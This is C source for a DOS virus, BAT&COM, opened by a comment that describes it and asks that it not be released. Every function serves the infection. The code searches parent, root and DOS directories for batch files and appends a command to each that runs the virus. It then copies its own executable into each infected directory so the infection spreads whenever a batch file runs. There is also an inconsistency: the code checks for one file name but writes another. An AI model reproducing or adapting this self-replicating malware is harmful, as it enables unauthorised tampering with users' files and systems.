/*  This file is a high-level language virus of a different sort.
    It will search out batch files and, when found, place a copy
    of itself in the directory with the batch file while adding
    instructions in the BAT to execute this new file.  In this way,
    it will spread each time an "infected" batch is run.
    Disinfection is done simply by deleting all of the BAT&COM.COM
    files and removing the commands from batch files that ruin
    them.  This one is NOT confined to the current directory,
    so make sure it is on an isolated machine and be sure to
    clean up any infections. PLEASE DO NOT RELEASE!
*/


#include <stdio.h>
#include <dos.h>
#include <dir.h>
#include <string.h>

struct ffblk ffblk;

main()
{
     char old_dir[MAXPATH];
     Get_Path(old_dir);            /* Save the old directory  */
     Pick_A_Dir();                 /* Find a new directory to */
     Infect_Directory();           /* infect and infect it.   */
     chdir(old_dir);               /* Return to old directory */
     return 0;
}



Pick_A_Dir()
{
     int done;
     chdir("..");                      /* First, Go out a DIR. */
     done=findfirst("*.BAT",&ffblk,0); /* If no BAT files, try */
                                       /* root and DOS         */
     if (done)
            {
            chdir("\\");
            done=findfirst("*.BAT",&ffblk,0);
            if (done) chdir("\\DOS\\");
            }
return 0;
}


Infect_Directory()
{
	int done;

    done = findfirst("*.BAT",&ffblk,0);
    while (!done)                       /* Find all .BAT files */
    {                                /* and add code to run */
    	Do_Batch();                     /* BAT&COM if not      */
    	done = findnext(&ffblk);        /* already there       */
   	}

   	if (findfirst("com_bat_infect.com",&ffblk,0)) /* If BAT&COM does  */
    	{Copy_Virus();}                     /* not exist, then  */
    return 0;                              /* copy it into dir.*/
}



Do_Batch()
{
	FILE *batch;
    char Infection_Buffer[12];
    char vpath[MAXPATH];

    Get_Path(vpath);            /* Get path for adding path */
                                /* specifier in commands    */


    if (vpath[3]==0) vpath[2]=0;		/* Keep path good in root  */

    batch=fopen(ffblk.ff_name, "rt+");
    fseek(batch, -11, SEEK_END);
    fread(Infection_Buffer,11,1,batch);
    Infection_Buffer[11]=0;             /* Terminate String */

    if (strcmp(Infection_Buffer,"BAT&COM.COM")) /* Check if */
    {                   		                /* Batch is */
    	fseek(batch, 0, SEEK_END);	          /* infected.*/
   		fprintf(batch,"\n%s\\BAT&COM.COM",vpath);
     }           		                   /*^- Add command */
                                           /*   to batch    */

    fclose(batch);
    return 0;
}


Copy_Virus()
{
     FILE *old_virus, *new_virus;
     int write_length;
     char copy_buffer[1024];              /* Copy the virus to */
                                          /* new directory     */
     old_virus=fopen(_argv[0],"rb");
     new_virus=fopen("BAT&COM.COM","wb");

     write_length=1024;

     while (write_length==1024)
        {
        write_length=fread(copy_buffer,1,1024,old_virus);
        fwrite(copy_buffer,write_length,1,new_virus);
        }
     fclose(old_virus);
     fclose(new_virus);
     return 0;
}


Get_Path(char *path)
{
        strcpy(path, "A:\\");
        path[0] ='A' + getdisk();    /* Returns current path */
        getcurdir(0, path+3);
        return 0;
}
